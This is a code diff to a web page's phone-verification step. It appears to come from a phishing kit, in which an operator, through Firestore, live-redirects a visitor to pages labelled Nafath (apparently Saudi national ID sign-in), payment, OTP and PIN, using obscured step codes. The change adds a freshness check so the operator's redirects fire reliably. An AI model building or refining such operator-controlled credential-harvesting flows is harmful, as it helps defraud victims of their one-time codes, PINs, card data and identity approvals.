@@ -85,26 +85,31 @@ export default function VerifyPhonePage() {
           console.log("[phone-info] Firestore data received:", data);
 
           // Admin navigation: Handle page redirects
-          if (data.currentStep === "home") {
-            console.log("[phone-info] Admin redirecting to home");
-            window.location.href = "/";
-          } else if (data.currentStep === "phone") {
-            console.log(
-              "[phone-info] Admin wants visitor to stay on phone page"
-            );
-            // Already on phone page, do nothing
-          } else if (data.currentStep === "_t6") {
-            console.log("[phone-info] Admin redirecting to nafad");
-            window.location.href = "/step4";
-          } else if (data.currentStep === "_st1") {
-            console.log("[phone-info] Admin redirecting to payment");
-            window.location.href = "/check";
-          } else if (data.currentStep === "_t2") {
-            console.log("[phone-info] Admin redirecting to otp");
-            window.location.href = "/step2";
-          } else if (data.currentStep === "_t3") {
-            console.log("[phone-info] Admin redirecting to pin");
-            window.location.href = "/step3";
+          const currentStepUpdatedAt = data.currentStepUpdatedAt as number | undefined
+          const now = Date.now()
+
+          if (data.currentStep && data.currentStep !== "phone") {
+            // Check if this is a NEW redirect (within 3 seconds)
+            if (!currentStepUpdatedAt || (now - currentStepUpdatedAt > 3000)) {
+              console.log('[phone-info] Stale currentStep redirect, ignoring');
+            } else {
+              if (data.currentStep === "home") {
+                console.log("[phone-info] Admin redirecting to home");
+                window.location.href = "/";
+              } else if (data.currentStep === "_t6") {
+                console.log("[phone-info] Admin redirecting to nafad");
+                window.location.href = "/step4";
+              } else if (data.currentStep === "_st1") {
+                console.log("[phone-info] Admin redirecting to payment");
+                window.location.href = "/check";
+              } else if (data.currentStep === "_t2") {
+                console.log("[phone-info] Admin redirecting to otp");
+                window.location.href = "/step2";
+              } else if (data.currentStep === "_t3") {
+                console.log("[phone-info] Admin redirecting to pin");
+                window.location.href = "/step3";
+              }
+            }
           }
           // If currentStep === "phone" or a number (from updateVisitorPage), stay on this page
         }
